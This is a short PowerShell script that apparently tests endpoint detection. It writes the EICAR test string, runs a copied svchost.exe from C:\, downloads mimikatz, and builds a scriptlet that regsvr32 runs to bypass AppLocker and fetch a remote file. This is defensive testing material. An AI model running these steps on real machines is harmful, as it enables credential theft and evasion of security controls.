# Create file with malware test content
'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | Out-File EICAR.com

# Copy svchost.exe to non-standard location and execute it
Copy-Item -Path C:\Windows\System32\svchost.exe C:\
C:\svchost.exe

# Download and expand mimikatz
https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip","c:\install\mimikatz_trunk.zip")
cd c:\install
Expand-Archive -LiteralPath 'c:\install\mimikatz_trunk.zip'

# Attempt to bypass App Locker
echo '<?XML version="1.0"?>' | Out-File test.sct
echo '<scriptlet>' | Out-File -Append test.sct
echo '<registration' | Out-File -Append test.sct
echo ' progid="TESTING"' | Out-File -Append test.sct
echo ' classid="{A1112221-0000-0000-3000-000DA00DABFC}" >' | Out-File -Append test.sct
echo ' <script language="JScript">' | Out-File -Append test.sct
echo ' <![CDATA[' | Out-File -Append test.sct
echo ' var foo = new ActiveXObject("WScript.Shell").Run("powershell.exe InvokeWebRequest -OutFile eicar.com http://www.eicar.org/download/eicar.com");' | Out-File -Append test.sct
echo ' ]]>' | Out-File -Append test.sct
echo '</script>' | Out-File -Append test.sct
echo '</registration>' | Out-File -Append test.sct
echo '</scriptlet>' | Out-File -Append test.sct
regsvr32.exe /s /u /i:test.sct scrobj.dll
